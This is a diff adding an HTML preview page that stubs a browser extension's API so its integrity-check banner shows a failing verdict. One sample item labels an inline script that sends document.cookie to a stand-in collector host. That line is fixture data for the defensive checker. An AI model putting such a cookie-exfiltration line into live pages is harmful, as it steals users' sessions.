@@ -1,0 +1,31 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>genpw banner preview</title>
+  <style>body { font: 14px system-ui, sans-serif; padding: 16px; }</style>
+</head>
+<body>
+  <h1>Banner preview</h1>
+  <p>Loads <code>content/verify.js</code> with a stubbed extension API that reports a failing verdict.</p>
+  <script>
+    // Stub of the bits of the extension API verify.js uses.
+    window.chrome = {
+      runtime: {
+        sendMessage: async () => ({
+          status: "fail",
+          items: [
+            { url: location.origin + "/static/js/gen.js", status: "mismatch", reason: "hash differs from the pinned hash" },
+            { url: location.origin + "/static/js/evil.js", status: "unknown-code", reason: "script/style not in the pinned set" },
+            { url: "https://cdn.example.net/lib.min.js", status: "external-code", reason: "script/style loaded from another site" },
+            { url: "inline: fetch('https://collector.example/' + document.cookie)", status: "inline-script", reason: "inline script not present in the templates" },
+            { url: location.origin + "/static/img/new.png", status: "unknown", reason: "resource not in the pinned set" },
+            { url: location.origin + "/static/css/w3.css", status: "ok", reason: "verified" },
+          ],
+        }),
+      },
+    };
+  </script>
+  <script src="../content/verify.js"></script>
+</body>
+</html>
